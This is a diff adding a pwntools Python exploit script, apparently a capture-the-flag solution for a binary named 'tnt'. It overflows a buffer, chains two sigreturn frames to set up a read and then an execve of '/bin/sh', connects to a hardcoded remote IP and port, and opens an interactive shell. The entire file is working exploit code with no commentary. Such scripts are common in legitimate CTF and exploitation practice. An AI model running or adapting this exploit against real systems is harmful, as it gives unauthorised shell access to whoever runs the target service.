@@ -1,0 +1,42 @@
+from pwn import *
+context.log_level = "debug"
+context.update(arch="amd64", os="linux")
+context.terminal = ["qterminal", "-e"]
+reread = 0x4000EE
+sys_reread = 0x4000EC
+fram_1=SigreturnFrame()
+fram_1.rsp=0x600108
+fram_1.rax=0
+fram_1.rdi=0
+fram_1.rsi=0x600108
+fram_1.rdx=0x400
+fram_1.rip=sys_reread
+fram_exe=SigreturnFrame()
+fram_exe.rax=constants.SYS_execve
+fram_exe.rdi=0x600108+0x100
+fram_exe.rsi=0
+fram_exe.rdx=0
+fram_exe.rsp=0x600800
+fram_exe.rip=0x4000e5
+
+
+paylaod = b'a'*0x10+p64(reread) + p64(sys_reread)+bytes(fram_1)
+p=remote('123.59.196.133',10034)
+#p=process('./tnt')
+#gdb.attach(p,'b* 0x4000EE')
+
+p.send(paylaod)
+#pause()
+sleep(0.1)
+#set rax
+p.send(b'a'*0xf)
+#pause()
+sleep(0.1)
+#signal_read_ret first
+payload2=p64(sys_reread)+bytes(fram_exe)+b'/bin/sh\x00'
+p.send(payload2)
+#reread_ set rax
+#pause()
+sleep(0.1)
+p.send(b'a'*0xf)
+p.interactive()
